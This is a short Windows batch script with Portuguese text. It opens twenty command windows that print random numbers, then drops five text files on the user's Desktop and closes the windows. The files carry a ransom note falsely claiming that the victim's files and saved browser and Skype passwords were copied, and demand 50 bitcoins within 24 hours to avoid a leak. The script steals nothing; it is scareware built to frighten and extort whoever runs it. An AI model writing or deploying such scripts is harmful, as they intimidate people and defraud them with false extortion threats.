@echo off

echo Vitinho lindo!

for /l %%i in (1,1,20) do (
    start cmd /k "title Aba %%i && echo Executando Aba %%i && setlocal EnableDelayedExpansion && for /l %%n in (1,1,10) do (echo !random!) && endlocal && timeout /t 1 > nul"
)

timeout /t 10 > nul

for /l %%i in (1,1,5) do (
    echo Copiei todos arquivos de dados salvos no seu computador, senhas salvas no navegador e senha de programas como skype e etc, para que eu não vaze nenhuma informação eu quero que você deposite 50 bitcoins nessa conta:  44000-223330-223304. você tem 24 horas > "%USERPROFILE%\Desktop\arquivo%%i.txt"
)

taskkill /f /fi "WINDOWTITLE eq Aba*"
